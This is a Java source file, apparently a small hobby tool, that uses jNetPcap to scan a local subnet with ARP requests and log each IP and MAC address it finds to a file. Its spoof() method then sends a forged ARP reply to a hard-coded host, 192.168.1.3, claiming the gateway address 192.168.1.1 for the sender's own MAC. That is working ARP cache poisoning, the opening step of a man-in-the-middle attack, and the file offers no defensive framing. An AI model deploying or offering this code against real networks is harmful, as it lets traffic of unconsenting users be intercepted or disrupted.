import io.netty.buffer.ByteBuf;
import org.jnetpcap.Pcap;
import org.jnetpcap.PcapIf;
import org.jnetpcap.packet.JMemoryPacket;
import org.jnetpcap.packet.PcapPacket;
import org.jnetpcap.packet.PcapPacketHandler;
import org.jnetpcap.protocol.JProtocol;
import org.jnetpcap.protocol.lan.Ethernet;
import org.jnetpcap.protocol.network.Arp;
import org.jnetpcap.protocol.tcpip.Tcp;

import java.io.FileWriter;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.*;

import static java.lang.System.out;

public class ARP {
    private short hType = 0x001, pType = 0x800, op = 1;
    private byte hLen = 0x6, pLen = 0x4;
    private NetworkInfo netInf = new NetworkInfo();
    private byte[] sha = netInf.getMac(), spa = netInf.getIP(),
            tha = {(byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0xff},
            target = {(byte)192, (byte)168, 1, 3};
    private Map<ByteBuffer, ByteBuffer> macs = new HashMap<>();
    private List<PcapIf> alldevs = new ArrayList<PcapIf>(); // Will be filled with NICs
    private StringBuilder errbuf = new StringBuilder(); // For any error msgs

    private int snaplen = 64 * 1024; // Capture all packets, no trucation
    private int flags = Pcap.MODE_PROMISCUOUS; // capture all packets
    private int timeout = 10 * 1000; // 10 seconds in millis
    Pcap pcap = pcapOpen();
    public PcapIf findDevice(){
        int r = Pcap.findAllDevs(alldevs, errbuf);
        if (r != Pcap.OK || alldevs.isEmpty()) {
            System.err.printf("Can't read list of devices, error is %s",
                    errbuf.toString());
            return null;
        }

        PcapIf dev = null;
        byte[] mac;
        try {
            for (PcapIf device : alldevs) {
                mac = device.getHardwareAddress();
                if (Arrays.equals(mac, sha)) dev = device;
            }
        } catch (IOException ex) {
            ex.printStackTrace();
        }

        out.printf("\nChoosing '%s' on your behalf:\n",
                (dev.getDescription() != null) ? dev.getDescription()
                        : dev.getName());
        return dev;
    }

    public Pcap pcapOpen(){
        Pcap pcap = Pcap.openLive(findDevice().getName(), snaplen, flags, timeout, errbuf);
        if (pcap == null) {
            System.err.printf("Error while opening device for capture: "
                    + errbuf.toString());
            return null;
        }
        return pcap;
    }

   void sendPackets(int n){
        int packetSize = 42;
        byte[] addr = Arrays.copyOf(spa, spa.length);
        addr[3] -= (addr[3] - 1);
        JMemoryPacket packet = new JMemoryPacket(packetSize);
        packet.order(ByteOrder.BIG_ENDIAN);
        packet.setUShort(12, 0x806);
        packet.scan(JProtocol.ETHERNET_ID);
        Ethernet ethernet = packet.getHeader(new Ethernet());
        ethernet.source(sha);
        packet.setUShort(14, hType);
        packet.setUShort(16, pType);
        packet.setUByte(18, hLen);
        packet.setUByte(19, pLen);
        packet.setUShort(20, op);
        packet.setByteArray(22, sha);
        packet.setByteArray(28, spa);
        packet.setByteArray(32, tha);
        ethernet.destination(tha);
        for (int i = 0; i < n; i++) {
            packet.setByteArray(38, addr);
            packet.scan(JProtocol.ETHERNET_ID);
            addr[3]++;
            pcap.sendPacket(ByteBuffer.wrap(packet.getByteArray(0, packetSize)));
        }
    }
    private PcapPacketHandler<String> jpacketHandler = new PcapPacketHandler<String>() {
        Arp arp = new Arp();

        @Override
        public void nextPacket(PcapPacket packet, String user) {
            if (packet.hasHeader(arp)) {
                ByteBuffer ip = ByteBuffer.wrap(arp.spa());
                ByteBuffer mac = ByteBuffer.wrap(arp.sha());
                if (!macs.containsKey(ip)) {
                    macs.put(ip, mac);
                }
            }
        }
    };

   void capture(int n) {
       pcap.loop(n, jpacketHandler, "jNetPcap");
   }

   void close(){
       pcap.close();
   }

   void networkDevices(){
       try(FileWriter writer = new FileWriter("out.txt")){
           writer.write("");
       }catch(IOException ex){
           ex.printStackTrace();
       }
       StringBuilder ipStr, macStr;
       byte[] mc;
       byte[] ip;
       for (Map.Entry<ByteBuffer, ByteBuffer> entry : macs.entrySet()) {
           ByteBuffer bf = entry.getKey();
           ip = bf.array();
           ipStr = new StringBuilder();

           ipStr.append("IP: ");
           for (int i = 0; i < ip.length - 1; i++) {
               ipStr.append(0xff & (int) ip[i]);
               ipStr.append(".");
           }
           ipStr.append(0xff & (int) ip[ip.length - 1]);
           bf = entry.getValue();
           mc = bf.array();
           macStr = new StringBuilder();
           macStr.append("    MAC: ");
           for (int i = 0; i < mc.length; i++) {
               macStr.append(String.format("%02X%s", mc[i], (i < mc.length - 1) ? "-" : ""));
           }
           if(Arrays.equals(ip, spa)) macStr.append("  <-  Your Device");
           try(FileWriter writer = new FileWriter("out.txt", true)){
               writer.write(ipStr.toString() + macStr.toString() + "\n");
           }catch(IOException ex){
               ex.printStackTrace();
           }
       }
   }

   void spoof(){
       byte[] ip = {(byte)192, (byte)168, 1, 1};
       int packetSize = 42;
       byte[] tgt = Arrays.copyOf(tha, tha.length);
       for (Map.Entry<ByteBuffer, ByteBuffer> entry : macs.entrySet()) {
           ByteBuffer bf = entry.getKey();
           byte[] i = bf.array();
           if(Arrays.equals(i, target)) tgt = entry.getValue().array();
       }
       JMemoryPacket packet = new JMemoryPacket(packetSize);
       packet.order(ByteOrder.BIG_ENDIAN);
       packet.setUShort(12, 0x806);
       packet.scan(JProtocol.ETHERNET_ID);
       Ethernet ethernet = packet.getHeader(new Ethernet());
       ethernet.source(sha);
       packet.setUShort(14, hType);
       packet.setUShort(16, pType);
       packet.setUByte(18, hLen);
       packet.setUByte(19, pLen);
       packet.setUShort(20, 2);
       packet.setByteArray(22, sha);
       packet.setByteArray(28, ip);
       packet.setByteArray(32, tgt);
       ethernet.destination(tgt);
       packet.setByteArray(38, target);
       packet.scan(JProtocol.ETHERNET_ID);
       pcap.sendPacket(ByteBuffer.wrap(packet.getByteArray(0, packetSize)));
   }
}
